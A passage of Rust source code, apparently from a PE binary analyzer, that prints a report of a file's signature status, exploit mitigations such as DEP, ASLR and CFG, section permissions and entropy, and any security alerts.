    println!("Digital Sign:   {}", if report.has_digital_signature { "SIGNED (VALID)" } else { "UNSIGNED" });
    println!("\n--- Active Exploit Mitigations ---");
    println!("DEP / NX:       {}", if report.mitigations.has_dep { "YES" } else { "NO" });
    println!("ASLR:           {}", if report.mitigations.has_aslr { "YES" } else { "NO" });
    println!("High Entropy:   {}", if report.mitigations.has_high_entropy_aslr { "YES" } else { "NO" });
    println!("CFG:            {}", if report.mitigations.has_cfg { "YES" } else { "NO" });
    println!("SafeSEH:        {}", if report.mitigations.has_safeseh { "YES" } else { "NO" });
    println!("GS Stack:       {}", if report.mitigations.has_gs { "YES" } else { "NO" });
    println!("\n--- Sections ({}) ---", report.sections.len());
    for sec in &report.sections {
        let p = format!("{}{}{}", if sec.is_readable {"R"} else {"-"}, if sec.is_writable {"W"} else {"-"}, if sec.is_executable {"X"} else {"-"});
        println!("  {:<8} RVA:0x{:08X} Size:{:<8} Entropy:{:.2} Perms:{} Susp:{}", sec.name, sec.virtual_address, sec.raw_data_size, sec.entropy, p, if sec.is_suspicious {"YES"} else {"NO"});
    }
    if !report.security_issues.is_empty() {
        println!("\n--- Alerts ---");
        for issue in &report.security_issues { println!("  [!] {}", issue); }
    }
    println!("==================================================\n");
}
